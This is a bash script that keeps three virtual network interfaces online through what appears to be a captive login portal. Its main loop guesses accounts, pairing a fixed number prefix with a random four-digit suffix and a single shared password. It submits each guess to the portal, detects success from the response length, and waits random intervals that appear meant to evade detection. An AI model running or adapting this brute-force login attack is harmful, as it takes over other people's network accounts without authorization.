#!/usr/bin/env bash

current_if=""

log() {
    current_time=$(date "+%Y/%m/%d %T")
    echo "$current_time" "$1"
}

choose_if() {
    log "choosing interface to login"
    response_vth0=$(curl "www.baidu.com" -s --interface "vth0")
    response_vth1=$(curl "www.baidu.com" -s --interface "vth1")
    response_vth2=$(curl "www.baidu.com" -s --interface "vth2")
    if [ -n "$response_vth0" ]; then
        log "vth0 up"
    else
        log "vth0 down, ready to login"
        current_if="vth0"
        return
    fi
    if [ -n "$response_vth1" ]; then
        log "vth1 up"
    else
        log "vth1 down, ready to login"
        current_if="vth1"
        return
    fi
    if [ -n "$response_vth2" ]; then
        log "vth2 up"
    else
        log "vth2 down, ready to login"
        current_if="vth2"
        return
    fi
    log "all interfaces up"
    exit 0
}

choose_if

login() {
    curl "http://<some_addr>/login?DDDDD=$1&upass=$2&R1=0&R2=&R3=2&R6=0&para=00&0MKKey=123456&buttonClicked=&redirect_url=&err_flag=&username=&password=&user=&cmd=&Login=&v6ip=" \
        -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
        -H 'Accept-Language: zh-CN,zh;q=0.9' \
        -H 'Connection: keep-alive' \
        -H 'Referer: http://<some_addr>/a70.htm?isReback=1' \
        -H 'Upgrade-Insecure-Requests: 1' \
        -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36' \
        -i -s --interface "$3"
}

while true; do
    sleep_time=$((RANDOM % 50 + 20))
    sleep $sleep_time

    account=<some_number>$((RANDOM % 8999 + 1000))
    password=<some_password>

    log "using account: $account, password $password"
    response=$(login $account $password $current_if)

    length=$(echo "$response" | grep -i 'Content-length:')

    if [ -n "$length" ]; then

        if [[ "$length" =~ Content-length:[[:space:]](3[0-9]*) ]]; then # login failed
            log "length: ${BASH_REMATCH[1]}, login failed"
            continue

        elif [[ "$length" =~ Content-length:[[:space:]](4[0-9]*) ]]; then # login success
            log "length: ${BASH_REMATCH[1]}, login success"
            choose_if
            continue

        elif [[ "$length" =~ Content-length:[[:space:]](6[0-9]*) ]]; then # login system error
            log "length: ${BASH_REMATCH[1]}, login system error"
            continue
        else
            log "unknown content length: ${length:16}"
        fi

    else
        log "no content length header found: $response"
    fi

done
